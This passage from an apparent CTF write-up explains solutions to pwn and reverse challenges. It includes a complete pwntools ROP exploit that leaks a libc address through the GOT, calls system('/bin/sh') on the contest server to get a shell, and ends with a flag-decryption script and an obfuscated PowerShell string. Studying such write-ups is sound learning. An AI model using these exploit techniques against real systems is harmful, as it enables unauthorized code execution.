</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Say something?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="0x04-ezrop">0x04 ezROP</h2>
<p>checksec看一下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203906560.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203906560.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203906560.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015203906560.png?size=large 2x" sizes="auto" data-title="image-20231015203906560" data-alt="image-20231015203906560" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>开了栈不可执行，但是是32位的（好久没看到32位的题目了）</p>
<p>开ida，发现溢出函数：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015204038605.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015204038605.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015204038605.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015204038605.png?size=large 2x" sizes="auto" data-title="image-20231015204038605" data-alt="image-20231015204038605" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里直接运行会多出一个wrong，因为wrong!和Say something: 是连着的。不过没有什么影响。</p>
<p>这里read了100h字节，存在栈溢出。但是system和/bin/sh都没有找到。</p>
<p>那么思路就很清楚了，由于write执行过一次，根据lazy binding的机制可以直接使用write打印出GOT表中write的真实地址。通过这个真实地址就可以找到libc的版本。再减去Libc中write的offset就可以得到libc的基址，那么加上system和/bin/sh的偏移，就可以getshell。</p>
<p>这里我选择手动查询Libc地址。首先连接远程泄露write的地址：</p>
<div class="highlight" id="id-16"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;game.ctf.seusus.com&#39;</span><span class="p">,</span><span class="mi">46494</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">vul</span> <span class="o">=</span> <span class="mh">0x804850c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vul</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;wrong&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span></span></span></code></pre></td></tr></table>
</div>
</div><p>得到的结果是:</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211516925.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211516925.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211516925.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211516925.png?size=large 2x" sizes="auto" data-title="image-20231015211516925" data-alt="image-20231015211516925" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>然后使用libc database search，找到对应的两个库文件：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211550081.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211550081.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211550081.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211550081.png?size=large 2x" sizes="auto" data-title="image-20231015211550081" data-alt="image-20231015211550081" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>（经过尝试，第二个是正确的库文件）</p>
<p>这里将write，system和bin_sh的地址直接记下来计算真实地址：</p>
<div class="highlight" id="id-17"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x0e57f0</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x03cf10</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17b9db</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;wrong&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p>成功getshell：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211813600.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211813600.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211813600.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015211813600.png?size=large 2x" sizes="auto" data-title="image-20231015211813600" data-alt="image-20231015211813600" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>完整的exp:</p>
<div class="highlight" id="id-18"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ezROP&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#r = elf.process()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;game.ctf.seusus.com&#39;</span><span class="p">,</span><span class="mi">46494</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">vul</span> <span class="o">=</span> <span class="mh">0x804850c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">vul</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;wrong&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x0e57f0</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x03cf10</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x17b9db</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;wrong&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h1 id="reverse">Reverse</h1>
<h2 id="0x01-signin-1">0x01 signin</h2>
<p>首先查壳，发现32位无壳。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214520917.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214520917.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214520917.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214520917.png?size=large 2x" sizes="auto" data-title="image-20231015214520917" data-alt="image-20231015214520917" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>使用ida打开，如下图所示：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214640210.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214640210.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214640210.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015214640210.png?size=large 2x" sizes="auto" data-title="image-20231015214640210" data-alt="image-20231015214640210" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现输入的是32位字符串（应该就是flag）。加密的逻辑很简单：先将<strong>除了最后一位</strong>的每一位和下一位进行异或，然后每隔两位将其和后半段的对应字符交换（直接说的话太抽象了，但是代码很好看明白）。</p>
<p>于是，解密的逻辑直接反着来就行。先交换，因为再用同样的办法交换一次就可以交换回原位置，所有交换的代码不用改动。接下来异或。这里我们发现由于加密是<code>buf[i] = buf[i] ^ buf[i + 1]</code>，buf的最后一位并没有被操作过，那么要得到原来的<code>buf[i]</code>，就得<strong>从最后一位</strong>向前用buf[i+1]和buf[i]异或。</p>
<p>将41f000处的32个字符进行解密即可。依据上面的思路，代码如下所示：</p>
<div class="highlight" id="id-19"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">a</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x6b</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x7</span><span class="p">,</span><span class="mh">0x7</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x75</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">31</span><span class="p">;</span><span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>结果如下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015215713651.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015215713651.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015215713651.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015215713651.png?size=large 2x" sizes="auto" data-title="image-20231015215713651" data-alt="image-20231015215713651" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x02-babypowershell">0x02 babyPowerShell</h2>
<div class="highlight" id="id-20"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="s1">&#39;w&#39;</span><span class="p">+(</span><span class="s2">&#34;{0}{1}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;yes&#39;</span><span class="p">,</span><span class="s1">&#39;us&#39;</span><span class="p">)+</span><span class="s1">&#39;c&#39;</span><span class="p">+</span><span class="s1">&#39;tf&#39;</span><span class="p">+</span><span class="s1">&#39;{Pow&#39;</span><span class="p">+(</span><span class="s2">&#34;{1}{0}{2}&#34;</span> <span class="o">-f</span><span class="s1">&#39;shel&#39;</span><span class="p">,</span><span class="s1">&#39;er&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">)+</span><span class="s1">&#39;_&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">+(</span><span class="s2">&#34;{0}{1}&#34;</span><span class="o">-f</span><span class="s1">&#39;sss&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">)+</span><span class="s1">&#39;ss&#39;</span><span class="p">+(</span><span class="s2">&#34;{2}{0}{1}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;sss_v&#39;</span><span class="p">,</span><span class="s1">&#39;ss&#39;</span><span class="p">)+(</span><span class="s2">&#34;{1}{2}{0}&#34;</span><span class="o">-f</span> <span class="s1">&#39;_ez_f&#39;</span><span class="p">,</span><span class="s1">&#39;err&#39;</span><span class="p">,</span><span class="s1">&#39;y&#39;</span><span class="p">)+</span><span class="s1">&#39;o&#39;</span><span class="p">+</span><span class="s1">&#39;rrr&#39;</span><span class="p">+</span><span class="s1">&#39;r&#39;</span><span class="p">+</span><span class="s1">&#39;rr&#39;</span><span class="p">+</span><span class="s1">&#39;r&#39;</span><span class="p">+</span><span class="s1">&#39;r_you}&#39;</span><span class="p">+(</span><span class="s2">&#34;{1}{0}&#34;</span> <span class="o">-f</span> <span class="s1">&#39;zZRout&#39;</span><span class="p">,</span><span class="s1">&#39;wye&#39;</span><span class="p">)+(</span><span class="s2">&#34;{0}{1}&#34;</span><span class="o">-f</span><span class="s1">&#39;-nul&#39;</span><span class="p">,</span><span class="s1">&#39;l&#39;</span><span class="p">)).</span><span class="py">REPLAce</span><span class="p">(</span><span class="s1">&#39;zZR&#39;</span><span class="p">,[</span><span class="no">StRing][CHAR</span><span class="p">]</span><span class="mf">124</span><span class="p">).</span><span class="py">REPLAce</span><span class="p">(([</span><span class="no">CHAR</span><span class="p">]</span><span class="mf">119</span><span class="p">+[</span><span class="no">CHAR</span><span class="p">]</span><span class="mf">121</span><span class="p">+[</span><span class="no">CHAR</span><span class="p">]</span><span class="mf">101</span><span class="p">),[</span><span class="no">StRing][CHAR</span><span class="p">]</span><span class="mf">34</span><span class="p">)|.(</span> <span class="nv">$EnV:COMsPEC</span><span class="p">[</span><span class="mf">4</span><span class="p">,</span><span class="mf">26</span><span class="p">,</span><span class="mf">25</span><span class="p">]</span><span class="n">-JoiN</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
